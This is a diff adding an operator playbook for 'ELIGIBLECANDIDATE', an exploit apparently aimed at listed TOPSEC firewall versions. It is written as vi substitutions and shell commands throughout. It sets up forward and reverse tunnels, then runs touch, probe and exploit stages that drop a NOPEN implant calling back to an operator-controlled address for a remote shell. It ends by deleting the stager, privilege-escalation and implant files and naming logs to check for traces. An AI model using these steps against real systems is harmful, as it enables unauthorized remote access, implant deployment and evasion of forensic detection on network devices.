@@ -1,0 +1,105 @@
+####
+## ELIGIBLECANDIDATE (ELCA) OPS script
+## ELCA v1.1.0.1
+## Current supports TOPSEC firewall versions 3.3.005.057.1 to 3.3.010.024.1 
+## 
+##
+####
+
+:syntax on
+
+
+
+
+mx
+:%s/\$TARGETIP/TARGETIP/g
+:%s/\$NOPEN/noserver-3.0.5.3-i686.pc.linux.gnu.redhat-5.0-static/g
+:%s/\$NOCLIENT/noclient-3.0.5.3/g
+:%s/\$RHP1/RHP1/g
+:%s/\$CBIPADDR/CBIPADDR/g
+`x
+
+
+
+# Requires python 2.7 or greater and moving files to /current/bin. If you are planning on throw ELCO after trying candidate...remove these directories.
+cp -R /current/bin/FW/ELCA/* /current/bin/
+
+
+#################
+#    Survey     #
+#################
+
+
+# Set up forward tunnel to TCP/443 on the target, and reverse tunnel for NOPEN.
+
+-tunnel
+l 443 $TARGETIP 443
+r $RHP1 127.0.0.1 $RHP1
+
+#perform touch to gather info and set env for exploit
+
+./eligiblecandidate.py -t https://127.0.0.1:443 touch
+
+
+# perform probe to asses vulnerability
+
+./eligiblecandidate.py -l probe
+
+# Exploit can be thrown by specifying RAT on cli or via ELCA.cfg
+
+
+
+#################
+#    Exploit    #
+#################
+
+# Set up your listener locally :
+
+/current/bin/FW/NOPEN/$NOCLIENT -l $RHP1
+
+
+# Throwing ELCA with NOPEN cli 
+
+./eligiblecandidate.py -l exploit -p /current/bin/FW/NOPEN/$NOPEN  -c $CBIPADDR:$RHP1
+
+
+# Throwing with ELCO.cfg
+#
+# vi Contents of ELCA.cfg to match as follows:
+# Change settings to include the proper bin path for your static NOPEN.
+#{
+#    "timeout": 120,
+#    "tool": "nopen",
+#    "binpath": "/current/bin/FW/NOPEN/noserver-3.0.5.3-i686.pc.linux.gnu.redhat-5.0-static"
+#}
+
+ cat ELCA.cfg |sed 's/\"binpath\":\"\"/\"binpath\":\"\/current\/bin\/FW\/$NOPEN\"/g' > .tmp; cat .tmp > ELCA.cfg; rm .tmp
+
+./eligiblecandidate.py -l exploit -c $CBIPADDR:$RHP1
+
+
+#################
+#    Cleanup    #
+#################
+
+# You should have your callback but if that fails perform the following clean up 
+ 
+./eligiblecandidate.py -l clean
+
+# On-Disk Artifacts possible
+#
+# XXX is a pseudo-random string chosen be HTTP
+#
+# /tmp/.a 		//stager script
+# /tmp/.b 		//pivesc
+# /tmp/cgiXXXXX		//copy of stager script 
+# /tmp/temp-XXXXXa	//Binary containing NOPEN,tinyexec,and setlog binaries
+
+rm /tmp/.a
+rm /tmp/.b
+rm /tmp/cgi*
+rm /tmp/temp-*
+
+# Check the following logs for artifacts
+# /www/logs/error_log			//may have errors related to deleting /wwwcookie/x
+# /data/oops* 					//Another location of possible logs .
